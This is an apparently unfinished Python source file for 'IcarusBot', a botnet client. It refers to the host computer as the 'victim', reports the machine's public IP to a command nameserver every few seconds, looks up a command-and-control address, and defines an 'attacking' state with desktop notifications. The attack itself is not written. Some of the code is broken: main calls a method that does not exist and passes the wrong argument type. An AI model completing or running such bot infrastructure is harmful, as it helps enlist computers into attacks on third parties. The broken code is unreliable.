# Keen to start
import requests
import socket, signal
import threading
import time
from config import API_URL
from enum import Enum
from win10toast import ToastNotifier


class IcarusBot():
    """
    A class used to represent the bot
    """
    def __init__(self):
        self.bot_id = 1 # should be random or grabbed somehow from victim computer
        signal.signal(signal.SIGINT, self.exit_gracefully)
        signal.signal(signal.SIGTERM, self.exit_gracefully)


    def exit_gracefully(self, signum, frame):
        """handle bot exit gracefully"""
        print("\Exiting...")
        self.update_thread.cancel()

    def lookup(self):
        """sends request to nameserver to get command ip and port"""
        r = requests.get(f'{API_URL}/api/lookup/bot/{self.bot_id}')
        if (r.status_code == 200):
            self.command_ip, self.command_port =  r.text.split('::')
            print(self.command_ip)
            print(self.command_port)
    
    def update(self):
        """updates nameserver with ip and port"""
        self.update_thread = threading.Timer(3.0, self.update)
        self.update_thread.start()
        ip = requests.get('https://api.ipify.org').content.decode('utf8')
        # TODO setting up sockets required for port
        payload = {'id':self.bot_id,'ip':ip,'port':25565}
        r = requests.post(f'{API_URL}/bot/update', data=payload)
        print('updating')

    def setup_socket(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def start(self):
        self.update()

class BotAction(Enum):
    """enum to track the status of our icarus bot"""
    STARTED = 0,
    ATTACKING = 1,
    STOPPED = 2


def main():
    bot = IcarusBot()
    bot.notification(True)
    bot.start()

def notification(action):
        """opens windows notification"""
        toast = ToastNotifier()
        title = ""
        body = ""
        if (action == BotAction.STARTED):
            title = "ICARUS BOT STARTED"
            body = "If you didn't expect this - whoops"
        elif (action == BotAction.ATTACKING):
            title = "ICARUS BOT ATTACKING"
            body = "The bot gave in to peer pressure and is attacking something"
        else:
            title = "ICARUS BOT CALLED OFF"
            body = "The bot finished it's job"

        toast.show_toast(
            title,
            body,
            duration = 5,
            threaded = True,
        )

if __name__ == "__main__":
    main();